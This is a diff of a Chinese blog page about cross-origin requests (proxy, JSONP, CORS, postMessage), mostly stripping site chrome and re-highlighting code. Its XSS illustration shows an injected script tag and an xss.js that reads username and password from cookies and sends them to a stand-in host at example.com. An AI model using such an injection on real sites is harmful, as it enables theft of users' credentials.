@@ -33,12 +33,10 @@
 
 
 
-  <link rel="alternate" href="/fountainpomelo.github.io/default" title="荒地">
+  <link rel="alternate" href="/fountainpomelo.github.io/atom.xml" title="荒地">
 
 
 
-
-  <link rel="shortcut icon" type="image/x-icon" href="/fountainpomelo.github.io/favicon.ico?v=2.10.1">
 
 
 
@@ -46,16 +44,12 @@
 
 
 
-  <link rel="stylesheet" type="text/css" href="/fountainpomelo.github.io/lib/fancybox/jquery.fancybox.css">
 
 
 
 
-  <link rel="stylesheet" type="text/css" href="/fountainpomelo.github.io/lib/nprogress/nprogress.min.css">
 
-
-
-<link rel="stylesheet" type="text/css" href="/fountainpomelo.github.io/css/style.css?v=2.10.1">
+<link rel="stylesheet" type="text/css" href="/fountainpomelo.github.io/css/style.css?v=">
 
 
 
@@ -87,7 +81,7 @@
 
 
 <script>
-  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true};
+  window.config = {"leancloud":"","toc":"","fancybox":"","pjax":""};
 </script>
 
     <title> 那些跨域问题 - 荒地 </title>
@@ -107,42 +101,6 @@
 <nav id="mobile-menu" class="mobile-menu slideout-menu">
   <ul class="mobile-menu-list">
     
-      <a href="/fountainpomelo.github.io/">
-        <li class="mobile-menu-item">
-          
-          
-            首页
-          
-        </li>
-      </a>
-    
-      <a href="/fountainpomelo.github.io/archives/">
-        <li class="mobile-menu-item">
-          
-          
-            归档
-          
-        </li>
-      </a>
-    
-      <a href="/fountainpomelo.github.io/tags/">
-        <li class="mobile-menu-item">
-          
-          
-            标签
-          
-        </li>
-      </a>
-    
-      <a href="/fountainpomelo.github.io/about">
-        <li class="mobile-menu-item">
-          
-          
-            关于
-          
-        </li>
-      </a>
-    
   </ul>
 </nav>
     
@@ -161,46 +119,6 @@
 </div>
 
 <nav class="site-navbar">
-  
-    <ul id="menu" class="menu">
-      
-        <li class="menu-item">
-          <a class="menu-item-link" href="/fountainpomelo.github.io/">
-            
-            
-              首页
-            
-          </a>
-        </li>
-      
-        <li class="menu-item">
-          <a class="menu-item-link" href="/fountainpomelo.github.io/archives/">
-            
-            
-              归档
-            
-          </a>
-        </li>
-      
-        <li class="menu-item">
-          <a class="menu-item-link" href="/fountainpomelo.github.io/tags/">
-            
-            
-              标签
-            
-          </a>
-        </li>
-      
-        <li class="menu-item">
-          <a class="menu-item-link" href="/fountainpomelo.github.io/about">
-            
-            
-              关于
-            
-          </a>
-        </li>
-      
-    </ul>
   
 </nav>
 </div>
@@ -230,13 +148,6 @@
 
     
     
-  <div class="post-toc" id="post-toc">
-    <h2 class="post-toc-title">文章目录</h2>
-    <div class="post-toc-content">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#同源策略"><span class="toc-text">同源策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF攻击"><span class="toc-text">CSRF攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proxy"><span class="toc-text">proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp"><span class="toc-text">jsonp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS攻击"><span class="toc-text">XSS攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS"><span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#预检机制"><span class="toc-text">预检机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postMessage"><span class="toc-text">postMessage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#document-domain"><span class="toc-text">document.domain</span></a></li></ol>
-    </div>
-  </div>
-
 
 
     <div class="post-content">
@@ -270,13 +181,13 @@
 <p>代理配置</p>
 <ul>
 <li><p>在 <code>config/index.js</code> 文件可配置 <code>proxyTable</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">proxyTable: &#123;</span><br><span class="line">  &apos;/api&apos;: &#123;</span><br><span class="line">    target: &apos;http://www.xxxx.com:8080&apos;,//连接后端接口的地址</span><br><span class="line">    changeOrigin: true,//是否允许跨越</span><br><span class="line">    pathRewrite: &#123; //是否重写地址</span><br><span class="line">      &apos;^/api&apos;: &apos;/&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">proxyTable: &#123;</span><br><span class="line">  <span class="string">'/api'</span>: &#123;</span><br><span class="line">    target: <span class="string">'http://www.xxxx.com:8080'</span>,<span class="comment">//连接后端接口的地址</span></span><br><span class="line">    changeOrigin: <span class="literal">true</span>,<span class="comment">//是否允许跨越</span></span><br><span class="line">    pathRewrite: &#123; <span class="comment">//是否重写地址</span></span><br><span class="line">      <span class="string">'^/api'</span>: <span class="string">'/'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>在<code>config</code>下新建一个 <code>api.config.js</code> 文件，在该文件判断此时为生产或开发环境</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const isPro = Object.is(process.env.NODE_ENV, &apos;production&apos;)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    baseUrl: isPro ? &apos;http://www.xxxx.com:8080&apos; : &apos;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isPro = <span class="built_in">Object</span>.is(process.env.NODE_ENV, <span class="string">'production'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    baseUrl: isPro ? <span class="string">'http://www.xxxx.com:8080'</span> : <span class="string">''</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>在 <code>main.js</code> 入口文件里</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import apiConfig from &apos;../config/api.config&apos;</span><br><span class="line">Axios.defaults.baseURL = apiConfig.baseUrl</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> apiConfig <span class="keyword">from</span> <span class="string">'../config/api.config'</span></span><br><span class="line">Axios.defaults.baseURL = apiConfig.baseUrl</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>此时，ojbk，提到的这种为 <code>proxy 跨域</code>。</p>
@@ -287,12 +198,12 @@
 <p>设置跨域是不是在某种程度上使得浏览器的同源策略功亏一篑了呢？<br>在浏览器端跨域，可能导致获取到其他网站的敏感信息或者越权操作，比如拿到银行的登录状态或者执行转账操作，所以应当禁止。<br>服务端跨域没有这个问题，因为用户的这些状态信息都是在浏览器端保存的，服务器只能有自己网站的状态信息。</p>
 <h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>在同源策略下，在某个服务器下的页面无法获取到该服务器以外的数据，但<code>img</code>、<code>iframe</code>、<code>script</code>等标签是个例外，这些标签可以通过<code>src</code>属性请求到其他服务器上的数据。</p>
 <p>基于此，我们可以通过动态创建<code>script</code>，再请求一个带参网址实现跨域通信。</p>
-<p>原生实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 传参并指定回调执行函数为myBack</span><br><span class="line">script.src = &apos;http://www.xxx.com:8080/login?user=admin&amp;callback=myBack&apos;;</span><br><span class="line"></span><br><span class="line">// 回调执行函数</span><br><span class="line">function myBack(res) &#123;</span><br><span class="line">    alert(JSON.stringify(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>jquery的ajax<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &apos;http://www.xxx.com:8080/login&apos;,</span><br><span class="line">    type: &apos;get&apos;,</span><br><span class="line">    dataType: &apos;jsonp&apos;,  // 请求方式为jsonp</span><br><span class="line">    jsonpCallback: &quot;myBack&quot;,    // 自定义回调函数名</span><br><span class="line">    data: &#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>原生实现<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传参并指定回调执行函数为myBack</span></span><br><span class="line">script.src = <span class="string">'http://www.xxx.com:8080/login?user=admin&amp;callback=myBack'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调执行函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myBack</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">    alert(<span class="built_in">JSON</span>.stringify(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>jquery的ajax<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'http://www.xxx.com:8080/login'</span>,</span><br><span class="line">    type: <span class="string">'get'</span>,</span><br><span class="line">    dataType: <span class="string">'jsonp'</span>,  <span class="comment">// 请求方式为jsonp</span></span><br><span class="line">    jsonpCallback: <span class="string">"myBack"</span>,    <span class="comment">// 自定义回调函数名</span></span><br><span class="line">    data: &#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
 <h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><p>即<code>Cross Site Scripting</code>，中文称跨站脚本攻击，是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p>
 <p>🌰：在一个留言板注入js，有下面这样一个留言板</p>
-<p><textarea>在此输入</textarea><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 代码注入示例</span><br><span class="line">&lt;textarea&gt;&lt;script src=&apos;http://www.example.com/xss.js&apos;&gt;&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// xss.js文件</span><br><span class="line">var username=toolHelper.getCookie(&apos;username&apos;).value;</span><br><span class="line">var password=toolHelper.getCookie(&apos;password&apos;).value;</span><br><span class="line">var script =document.createElement(&apos;script&apos;);</span><br><span class="line">script.src=&apos;http://www.example.com/index.php?username=&apos;+username+&apos;&amp;password=&apos;+password;</span><br><span class="line">document.body.appendChild(script);</span><br></pre></td></tr></table></figure>
+<p><textarea>在此输入</textarea><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码注入示例</span></span><br><span class="line">&lt;textarea&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://www.example.com/xss.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xss.js文件</span></span><br><span class="line"><span class="keyword">var</span> username=toolHelper.getCookie(<span class="string">'username'</span>).value;</span><br><span class="line"><span class="keyword">var</span> password=toolHelper.getCookie(<span class="string">'password'</span>).value;</span><br><span class="line"><span class="keyword">var</span> script =<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.src=<span class="string">'http://www.example.com/index.php?username='</span>+username+<span class="string">'&amp;password='</span>+password;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure>
 <p>几句简单的<code>javascript</code>，获取<code>cookie</code>中的用户名密码，利用<code>jsonp</code>把向 <code>http://www.example.com/index.php</code> 发送了一个<code>get</code>请求，.php背后一系列获取操作就把访问留言板的用户的信息窃取了。</p>
 <h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>即<code>(Cross-Origin Resource Sharing)</code>，中文 跨域资源共享，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，背后的基本思想是使用自定义的HTTP头部允许浏览器和服务器相互了解对方，从而决定请求或响应成功与否。目前所有浏览器都支持该功能(IE8+：IE8/9需要使用<code>XDomainRequest</code>对象来支持<code>CORS</code>)，<code>CORS</code>也已经成为主流的跨域解决方案。</p>
 <p><code>CORS</code>把<code>HTTP</code>请求分成两类，不同类别按不同的策略进行跨域资源共享协商。</p>
@@ -345,8 +256,8 @@
 <p>此外，服务器端还可以加入<code>Access-Control-Max-Age Header</code>，允许浏览器在指定时间内，无需再发送预检请求进行协商，直接用本次协商结果即可。浏览器根据OPTIONS请求返回的结果来决定是否继续发送真实的请求进行跨域资源访问。这个过程对真实请求的调用者来说是透明的</p>
 </blockquote>
 <p><code>XMLHttpRequest</code>支持通过<code>withCredentials</code>属性实现在跨域请求携带身份信息(<code>Credential</code>，例如<code>Cookie</code>或者<code>HTTP</code>认证信息)。浏览器将携带<code>Cookie Header</code>的请求发送到服务器端后，如果服务器没有响应<code>Access-Control-Allow-Credentials Header</code>，那么浏览器会忽略掉这次响应。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    ...</span><br><span class="line">   xhrFields: &#123;</span><br><span class="line">       withCredentials: true    // 前端设置是否带cookie</span><br><span class="line">   &#125;,</span><br><span class="line">   crossDomain: true,   // 会让请求头中包含跨域的额外信息，但不会含cookie</span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>vue axios<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axios.defaults.withCredentials = true</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    ...</span><br><span class="line">   xhrFields: &#123;</span><br><span class="line">       withCredentials: <span class="literal">true</span>    <span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">   &#125;,</span><br><span class="line">   crossDomain: <span class="literal">true</span>,   <span class="comment">// 会让请求头中包含跨域的额外信息，但不会含cookie</span></span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>vue axios<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axios.defaults.withCredentials = <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h2><p><code>window.postMessage()</code>方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递，是HTML5的一个接口，专注实现不同窗口不同页面的跨域通讯。</p>
 <p><code>postMessage(data,origin)</code>方法接受两个参数</p>
 <ul>
@@ -355,7 +266,7 @@
 <li><p><code>origin</code> 字符串参数，指明目标窗口的源</p>
 </li>
 <li><p>向目标网站发送消息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iframe.postMessage(&apos;getMessage&apos;,&apos;http://fountainyys.cn&apos;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iframe.postMessage(<span class="string">'getMessage'</span>,<span class="string">'http://fountainyys.cn'</span>);</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>接受消息<br>监听<code>window</code>的<code>message</code>事件</p>
 </li>
@@ -369,18 +280,6 @@
     
       
       
-
-  <div class="post-copyright">
-    <p class="copyright-item">
-      <span>原文作者: </span>
-      <a href="http://fountainyys.cn">fountainyys.cn</a>
-    </p>
-    <p class="copyright-item">
-      <span>原文链接: </span>
-      <a href="http://fountainyys.cn/2018/06/03/那些跨域问题/">http://fountainyys.cn/2018/06/03/那些跨域问题/</a>
-    </p>
-
-  </div>
 
 
 
@@ -427,10 +326,6 @@
           
   <div class="comments" id="comments">
     
-      <div id="lv-container" data-id="city" data-uid="MTAyMC80MTcwMy8xODI0OQ==">
-
-      </div>  
-    
   </div>
 
 
@@ -439,58 +334,12 @@
 
       <footer id="footer" class="footer"> 
 
-  <div class="social-links">
-    
-      
-        
-          <a href="mailto:fountain_x@outlook.com" class="iconfont icon-email" title="email"></a>
-        
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-        
-          <a href="https://weibo.com/u/2874806624" class="iconfont icon-weibo" title="weibo"></a>
-        
-      
-    
-      
-    
-      
-        
-          <a href="https://www.douban.com/people/114544231/?dt_dapp=1" class="iconfont icon-douban" title="douban"></a>
-        
-      
-    
-      
-    
-      
-    
-      
-    
-
-
-  </div>
-
  
 
 <div class="copyright">
   <span class="copyright-year">
     
     &copy; 
-     
-      2015 - 
     
     2019
    <span class="author">fountainyys.cn</span>
@@ -517,30 +366,11 @@
   
 
   
-   <script type="text/javascript">
-	(function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-  </script>
-
 
 
 
     
-  
 
-
-
-  
-  
 
 
 
@@ -555,21 +385,15 @@
   
 
   
-    <script type="text/javascript" src="/fountainpomelo.github.io/lib/fancybox/jquery.fancybox.pack.js"></script>
-  
 
   
-    <script type="text/javascript" src="/fountainpomelo.github.io/lib/pjax/jquery.pjax.min.js"></script>
-  
 
-  
-    <script type="text/javascript" src="/fountainpomelo.github.io/lib/nprogress/nprogress.min.js"></script>
   
 
 
     <script src="http://cdn.bootcss.com/headroom/0.5.0/headroom.min.js"></script>
 <script src="http://res2.wx.qq.com/open/js/jweixin-1.4.0.js "></script>
-<script type="text/javascript" src="/fountainpomelo.github.io/js/src/even.js?v=2.10.1"></script>
+<script type="text/javascript" src="/fountainpomelo.github.io/js/src/even.js?v="></script>
 
   </body>
 </html>
